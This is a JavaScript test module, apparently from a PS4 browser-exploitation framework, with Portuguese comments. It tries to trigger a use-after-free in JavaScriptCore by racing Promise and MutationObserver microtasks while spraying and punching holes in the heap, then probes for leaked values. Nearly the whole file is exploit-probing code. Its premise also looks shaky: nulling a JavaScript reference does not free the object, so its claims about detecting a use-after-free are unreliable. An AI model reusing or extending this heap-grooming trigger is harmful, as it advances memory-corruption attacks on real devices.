import { Groomer } from '../mod_groomer.js';

export default {
    id:       'PROMISE_MICROTASK_UAF',
    category: 'CoreJS',
    risk:     'HIGH',
    description:
        'Race Condition na Fila de Microtarefas do JSC. Intercala Promises com ' +
        'MutationObservers. Uma microtarefa destrói o contexto de execução (freed object), ' +
        'enquanto a microtarefa seguinte na C++ queue tenta invocar um callback no objeto morto.',

    setup: function() {
        this.results = { sequence: [] };
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.dummy = document.createElement('div');
        this.sandbox.appendChild(this.dummy);

        const self = this;
        // Objeto que será destruído, mas cujo método está agendado na fila
        this.victim = {
            id: 0x1337,
            callback: function() {
                try { self.results.leak = this.id; } catch(e) {}
            }
        };
    },

    trigger: async function() {
        const self = this;
        return new Promise(resolve => {
            
            // 1. Agendamos o callback da vítima (vai para a fila VIP C++)
            Promise.resolve().then(() => {
                // Como não usamos arrow function e forçamos o apply, o C++ tem de resolver o 'this'
                self.victim.callback.apply(self.victim);
            });

            // 2. O GATILHO: Agendamos um MutationObserver (também fila VIP)
            // Ele vai rodar ANTES ou DEPOIS da Promise (depende da implementação do PS4)
            let observer = new MutationObserver(() => {
                // Destruímos a vítima
                self.victim = null;
                
                // Forçamos lixo no Heap
                let trash = Groomer.sprayStrings(500, 1024);
                Groomer.punchHoles(trash, 2);
            });
            
            observer.observe(this.dummy, { attributes: true });
            this.dummy.setAttribute('data-trigger', '1'); // Dispara o Observer

            // Damos tempo para as microtarefas colidirem e saímos
            setTimeout(() => {
                observer.disconnect();
                resolve();
            }, 10);
        });
    },

    probe: [
        // Probe 0: O motor crascha ou segue em frente?
        s => s.results.leak ? 'Microtarefas Drenadas' : 'Conflito ou Protegido',
        
        // Probe 1: Acesso a memória freed
        s => {
            let val = s.results.leak;
            // Se o callback correu DEPOIS de victim = null, this.id devia ser indefinido/crash.
            // Se leu 0x1337 (4919), correu antes.
            // Se leu lixo gigante, temos UAF na fila de microtarefas!
            if (typeof val === 'number' && val !== 0x1337 && val > 10000) {
                return val; // Aciona o HUD Vermelho
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        try { this.dummy.remove(); } catch(e){}
        this.victim = null;
        this.dummy = null;
        this.results = {};
    }
};
